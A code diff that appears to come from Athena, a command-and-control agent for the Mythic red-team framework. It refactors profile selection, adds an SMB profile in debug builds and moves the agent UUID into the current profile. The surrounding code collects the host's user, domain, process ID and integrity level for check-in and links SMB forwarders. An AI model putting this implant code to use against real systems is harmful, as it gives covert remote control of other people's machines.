@@ -59,6 +59,9 @@ namespace Athena
         /// <param name="choice">The config to switch to, if null a random one will be selected</param>
         private IConfig SelectConfig(string choice)
         {
+#if DEBUG
+            return availableProfiles.FirstOrDefault().Value;
+#endif
             if (String.IsNullOrEmpty(choice))
             {
                 Random rand = new Random(); //Select profile at random from available ones
@@ -127,6 +130,7 @@ profiles.Add("Athena.Profiles.SMB");
 #endif
 #if DEBUG
             profiles.Add("Athena.Profiles.Debug");
+            profiles.Add("Athena.Profiles.SMB");
 #endif
             foreach (var profile in profiles)
             {
@@ -142,7 +146,7 @@ profiles.Add("Athena.Profiles.SMB");
                     {
                         if (typeof(IConfig).IsAssignableFrom(t))
                         {
-                            Console.WriteLine("Added Config.");
+                            Console.WriteLine("Added Config: " + profile);
                             configs.Add(profile, (IConfig)Activator.CreateInstance(t));
                         }
                     }
@@ -166,7 +170,7 @@ profiles.Add("Athena.Profiles.SMB");
 profiles.Add("Athena.Forwarders.SMB");
 #endif
 #if EMPTY || DEBUG
-profiles.Add("Athena.Profiles.Empty");
+profiles.Add("Athena.Forwarders.Empty");
 #endif
 
 
@@ -211,7 +215,7 @@ profiles.Add("Athena.Profiles.Empty");
                 user = Environment.UserName,
                 host = Dns.GetHostName(),
                 pid = Process.GetCurrentProcess().Id.ToString(),
-                uuid = Config.uuid,
+                uuid = this.currentConfig.profile.uuid,
                 architecture = await Misc.GetArch(),
                 domain = Environment.UserDomainName,
                 integrity_level = Misc.getIntegrity(),
@@ -325,7 +329,7 @@ profiles.Add("Athena.Profiles.Empty");
         /// <param name="e">TaskEventArgs containing the MythicJob object</param>
         private void StartForwarder(object sender, TaskEventArgs e)
         {
-            var res = this.forwarder.Link(e.job, Config.uuid).Result;
+            var res = this.forwarder.Link(e.job, this.currentConfig.profile.uuid).Result;
 
             ResponseResult result = new ResponseResult()
             {
@@ -596,7 +600,7 @@ profiles.Add("Athena.Profiles.Empty");
         {
             try
             {
-                Config.uuid = res.id;
+                this.currentConfig.profile.uuid = res.id;
 
                 if (this.currentConfig.profile.encrypted)
                 {
